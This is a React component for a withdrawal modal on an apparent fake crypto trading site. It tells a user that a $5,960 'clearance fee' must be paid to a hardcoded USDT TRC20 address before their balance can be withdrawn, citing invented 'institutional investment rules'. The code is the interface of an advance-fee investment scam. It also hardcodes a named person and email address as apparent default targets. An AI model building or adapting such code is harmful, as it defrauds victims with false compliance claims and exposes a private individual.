import React, { useState } from 'react';
import { useTrading } from '../../context/TradingContext';
import { Modal } from '../ui/Modal';
import { 
  AlertTriangle, 
  ShieldAlert, 
  Lock, 
  DollarSign, 
  ArrowRight, 
  Copy, 
  Check, 
  ExternalLink, 
  FileText,
  HelpCircle,
  Clock
} from 'lucide-react';

interface InvestmentNoticeModalProps {
  isOpen: boolean;
  onClose: () => void;
  onOpenDeposit?: () => void;
}

export const InvestmentNoticeModal: React.FC<InvestmentNoticeModalProps> = ({
  isOpen,
  onClose,
  onOpenDeposit,
}) => {
  const { 
    user, 
    cashBalanceUSD, 
    attemptedWithdrawalAmount, 
    attemptedWithdrawalAddress,
    addToast 
  } = useTrading();

  const [copiedAddress, setCopiedAddress] = useState(false);
  const clearanceAddress = 'TYDzsxdSpGs61CX82km62fEdPwtzNJe2oo';

  const handleCopyClearanceAddress = () => {
    navigator.clipboard.writeText(clearanceAddress);
    setCopiedAddress(true);
    addToast({
      type: 'info',
      title: 'Address Copied',
      message: 'Compliance deposit address copied to clipboard.',
      duration: 2500,
    });
    setTimeout(() => setCopiedAddress(false), 2000);
  };

  return (
    <Modal
      isOpen={isOpen}
      onClose={onClose}
      title="Withdrawal Authorization Notice"
      subtitle="Institutional Investment Rule Compliance Protocol"
      maxWidth="lg"
    >
      <div className="space-y-5">
        {/* Urgent Attention Banner */}
        <div className="p-4 rounded-xl bg-amber-500/10 border border-amber-500/30 flex items-start gap-3.5">
          <div className="p-2 rounded-lg bg-amber-500/20 text-amber-400 shrink-0 mt-0.5">
            <ShieldAlert className="w-5 h-5" />
          </div>
          <div className="space-y-1">
            <div className="text-xs font-bold text-amber-300 uppercase tracking-wider">
              Investment Compliance Restriction
            </div>
            <p className="text-sm font-black text-slate-100 leading-snug">
              $5,960.00 has to be paid before the available balance can be withdrawn, to meet with the investment rules.
            </p>
          </div>
        </div>

        {/* Account & Withdrawal Details Card */}
        <div className="rounded-xl bg-slate-900/90 border border-slate-800 p-4 space-y-3">
          <div className="flex items-center justify-between text-xs pb-2 border-b border-slate-800">
            <span className="text-slate-400 font-medium">Account Profile</span>
            <span className="font-bold text-slate-200">
              {user?.name || 'Joshua James Bergin'}
            </span>
          </div>

          <div className="flex items-center justify-between text-xs pb-2 border-b border-slate-800">
            <span className="text-slate-400 font-medium">Registered Email</span>
            <span className="font-mono text-slate-300">
              {user?.email || 'Berginjoshua1@gmail.com'}
            </span>
          </div>

          <div className="flex items-center justify-between text-xs pb-2 border-b border-slate-800">
            <span className="text-slate-400 font-medium">Available Account Balance</span>
            <span className="font-mono font-bold text-emerald-400 text-sm">
              ${cashBalanceUSD.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
            </span>
          </div>

          <div className="flex items-center justify-between text-xs pb-2 border-b border-slate-800">
            <span className="text-slate-400 font-medium">Requested Withdrawal Amount</span>
            <span className="font-mono font-bold text-slate-200">
              ${(attemptedWithdrawalAmount || cashBalanceUSD).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
            </span>
          </div>

          {attemptedWithdrawalAddress && (
            <div className="flex items-center justify-between text-xs pb-2 border-b border-slate-800">
              <span className="text-slate-400 font-medium">Destination Wallet</span>
              <span className="font-mono text-slate-300 truncate max-w-[200px]" title={attemptedWithdrawalAddress}>
                {attemptedWithdrawalAddress}
              </span>
            </div>
          )}

          <div className="flex items-center justify-between text-xs pt-1">
            <span className="text-amber-400 font-bold">Required Clearance Fee</span>
            <span className="font-mono font-black text-amber-400 text-base">
              $5,960.00 USD
            </span>
          </div>
        </div>

        {/* Investment Rule Details */}
        <div className="p-3.5 rounded-xl bg-slate-900/60 border border-slate-800/80 text-xs text-slate-300 space-y-2">
          <div className="flex items-center gap-1.5 font-bold text-slate-200">
            <FileText className="w-3.5 h-3.5 text-emerald-400" />
            <span>Investment Terms & Conditions (Section 4.2)</span>
          </div>
          <p className="text-slate-400 leading-relaxed text-[11px]">
            In accordance with institutional yield distribution regulations and account tier guidelines, an investment verification payment of <strong className="text-slate-200">$5,960.00 USD</strong> must be fulfilled to authenticate the settlement channel. Once completed, the full available balance of <strong className="text-emerald-400">${cashBalanceUSD.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD</strong> will be released to your external wallet address immediately.
          </p>
        </div>

        {/* Compliance Settlement Address Box */}
        <div className="p-3.5 rounded-xl bg-slate-950/70 border border-slate-800 space-y-2">
          <div className="flex items-center justify-between text-[11px]">
            <span className="font-semibold text-slate-300">
              Official Compliance Settlement Address (USDT TRC20)
            </span>
            <span className="text-emerald-400 font-bold">Instant Credit</span>
          </div>
          <div className="flex items-center gap-2">
            <input
              type="text"
              readOnly
              value={clearanceAddress}
              className="glass-input w-full px-3 py-2 rounded-lg font-mono text-xs text-slate-300 bg-slate-900"
            />
            <button
              type="button"
              onClick={handleCopyClearanceAddress}
              className="px-3 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-bold transition-all shrink-0 flex items-center gap-1 cursor-pointer"
            >
              {copiedAddress ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
              <span>{copiedAddress ? 'Copied' : 'Copy'}</span>
            </button>
          </div>
        </div>

        {/* Action Buttons */}
        <div className="flex flex-col sm:flex-row items-center gap-2.5 pt-2">
          {onOpenDeposit ? (
            <button
              type="button"
              onClick={() => {
                onClose();
                onOpenDeposit();
              }}
              className="w-full sm:flex-1 py-3 px-4 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-black text-xs transition-all shadow-lg shadow-emerald-500/20 active:scale-95 cursor-pointer flex items-center justify-center gap-2"
            >
              <DollarSign className="w-4 h-4" />
              <span>Pay Clearance Fee ($5,960.00)</span>
            </button>
          ) : (
            <button
              type="button"
              onClick={handleCopyClearanceAddress}
              className="w-full sm:flex-1 py-3 px-4 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-black text-xs transition-all shadow-lg shadow-emerald-500/20 active:scale-95 cursor-pointer flex items-center justify-center gap-2"
            >
              <DollarSign className="w-4 h-4" />
              <span>Copy Payment Address ($5,960.00)</span>
            </button>
          )}

          <button
            type="button"
            onClick={onClose}
            className="w-full sm:w-auto py-3 px-5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 font-bold text-xs transition-colors cursor-pointer"
          >
            Acknowledge & Close
          </button>
        </div>
      </div>
    </Modal>
  );
};
